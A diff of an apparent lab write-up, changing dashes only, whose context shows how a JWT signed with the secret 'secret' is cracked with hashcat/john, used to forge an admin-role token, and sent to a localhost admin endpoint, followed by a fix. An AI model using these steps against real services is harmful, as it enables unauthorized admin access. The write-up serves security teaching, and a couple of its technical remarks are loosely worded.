@@ -6,11 +6,11 @@
 const SECRET = 'secret';
 ```
 
-The server implements HS256 correctly — the flaw is the secret itself. HMAC is only a password hash; a guessable password makes it worthless.
+The server implements HS256 correctly - the flaw is the secret itself. HMAC is only a password hash; a guessable password makes it worthless.
 
 ## Exploit Steps
 
-### 1 — Get a token
+### 1 - Get a token
 
 Login with any username (not `admin`). The server sets a `session` cookie:
 
@@ -20,7 +20,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 .SomeSignatureHere
 ```
 
-### 2 — Crack the secret offline
+### 2 - Crack the secret offline
 
 ```bash
 # Hashcat
@@ -32,9 +32,9 @@ john token.txt --wordlist=rockyou.txt --format=HMAC-SHA256
 
 Result: `secret`
 
-### 3 — Forge an admin token
+### 3 - Forge an admin token
 
-The payload **must** include `role: "admin"` — that is what the authorization check reads.
+The payload **must** include `role: "admin"` - that is what the authorization check reads.
 
 ```python
 import jwt
@@ -48,7 +48,7 @@ Or with curl + the token from step 2:
 node -e "const j=require('jsonwebtoken'); console.log(j.sign({name:'hacker',role:'admin'},'secret'))"
 ```
 
-### 4 — Call the admin endpoint
+### 4 - Call the admin endpoint
 
 ```bash
 curl http://localhost:3000/api/admin/users \
@@ -67,7 +67,7 @@ Response:
 ## Why It Works
 
 - The secret is in every common wordlist.
-- Signature verification is offline — no server interaction needed to crack.
+- Signature verification is offline - no server interaction needed to crack.
 - Once the secret is known, any payload with `role: "admin"` will verify correctly.
 
 ## Fix
@@ -75,10 +75,10 @@ Response:
 ```javascript
 const { randomBytes } = require('crypto');
 const SECRET = randomBytes(64).toString('hex');
-// Store in an environment variable — never hardcode
+// Store in an environment variable - never hardcode
 ```
 
-Or switch to asymmetric signing (RS256/ES256) — no shared secret to steal.
+Or switch to asymmetric signing (RS256/ES256) - no shared secret to steal.
 
 ## Automated PoC
 
